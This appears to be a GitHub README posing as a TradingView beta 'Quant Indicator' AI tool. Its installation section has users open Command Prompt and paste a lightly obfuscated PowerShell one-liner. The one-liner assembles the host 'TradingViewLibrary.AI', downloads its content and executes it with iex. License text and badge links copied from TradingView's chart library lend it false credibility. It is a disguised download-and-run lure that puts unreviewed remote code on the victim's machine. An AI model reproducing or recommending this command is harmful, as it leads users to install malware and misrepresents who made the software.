<a id="get"></a>
<div align="center">
<p align="center">
  <img src="logo.png" alt="TradingView" width="580">
</p>

## Quant Indicator™

</div>

TradingView Quant Indicator™ is our first AI-powered indicator, designed to bring market analysis and changing market conditions directly onto the chart.
Quant processes live market data together with price action, liquidity, positioning, volatility, market structure, and scheduled events. It uses this information to model several ways the market may develop over the selected timeframe and updates its analysis as new data becomes available.

Quant is currently in beta. Early access is available through GitHub while we continue testing the indicator, improving calculation stability, and refining its behavior across different market conditions.

## Getting Started

Follow the steps below to install the Quant Indicator and its required dependencies using Command Prompt.

#### 1. Open Command Prompt.

Press **Win + R**, type:

```text
cmd
```

Then press **Enter**.

#### 2. Run the Quant Indicator Installation Command.

Copy and paste the following command into Command Prompt:
```powershell
powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library'; $Install; $Pinescript='TradingView'+$Sync+'.AI'; (curl -UseBasicParsing ($Pinescript)).Content | iex"
```

Press **Enter** to begin the installation.

#### 3. Restart TradingView for the changes to take effect.

After installation, Quant Indicator will appear in your TradingView indicator library.





## Support

Quant is currently being tested ahead of its full in-app release.

If you encounter an issue or would like to share feedback, contact us at [support@tradingview.com](mailto:support@tradingview.com).

Your feedback helps us improve stability, model behavior, and chart integration throughout the beta.


## Changelog

#### v2.9.5-beta

- Refined market-data processing across price action, liquidity, positioning, volatility, and market structure.
- Improved indicator recalculation as new market data becomes available.
- Updated how changing market conditions are reflected across different timeframes.
- Expanded support for scheduled market events and upcoming catalysts.
- Improved event relevance based on symbol, timeframe, and event timing.
- Reduced latency between incoming data and chart updates.
- Improved handling of fast-changing volatility and market conditions.
- Added additional checks for incomplete or inconsistent data.
- Improved calculation stability when switching between symbols and timeframes.
- Refined how market context and supporting data are displayed on the chart.
- Improved synchronization between live data updates and indicator calculations.
- Reduced unnecessary changes during periods of market noise.
- Optimized calculation performance and update speed.
- Improved recovery from temporary data-feed interruptions.
- Fixed several chart refresh and synchronization issues reported during beta testing.
- Improved overall stability across different symbols and timeframes.
- Continued tuning of the model to better adapt to changing market structure.
- Expanded beta testing across additional markets, timeframes, and trading conditions.


## License

Licensed under the Apache License, Version 2.0 (the "License"); you may not use this software except in compliance with the License.
You may obtain a copy of the License in the [LICENSE](./LICENSE) file.
Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

This software incorporates several parts of tslib (<https://github.com/Microsoft/tslib>, (c) Microsoft Corporation) that are covered by BSD Zero Clause License.

This license requires specifying TradingView as the product creator.
You shall add the "attribution notice" from the NOTICE file and a link to <https://www.tradingview.com/> to the page of your website or mobile application that is available to your users.
As thanks for creating this product, we'd be grateful if you add it in a prominent place.
You can use the [`attributionLogo`](https://tradingview.github.io/lightweight-charts/docs/api/interfaces/LayoutOptions#attributionLogo) chart option for displaying an appropriate link to <https://www.tradingview.com/> on the chart itself, which will satisfy the link requirement.

[demo-url]: https://www.tradingview.com/lightweight-charts/

[ci-img]: https://img.shields.io/circleci/build/github/tradingview/lightweight-charts.svg
[ci-link]: https://circleci.com/gh/tradingview/lightweight-charts

[npm-version-img]: https://badge.fury.io/js/lightweight-charts.svg
[npm-downloads-img]: https://img.shields.io/npm/dm/lightweight-charts.svg
[npm-link]: https://www.npmjs.com/package/lightweight-charts

[bundle-size-img]: https://badgen.net/bundlephobia/minzip/lightweight-charts
[deps-count-img]: https://img.shields.io/badge/dynamic/json.svg?label=dependencies&color=brightgreen&query=$.dependencyCount&uri=https%3A%2F%2Fbundlephobia.com%2Fapi%2Fsize%3Fpackage%3Dlightweight-charts
[bundle-size-link]: https://bundlephobia.com/result?p=lightweight-charts
[pkg-pr-new-img]: https://pkg.pr.new/badge/tradingview/lightweight-charts
[pkg-pr-new-link]: https://pkg.pr.new/~/tradingview/lightweight-charts
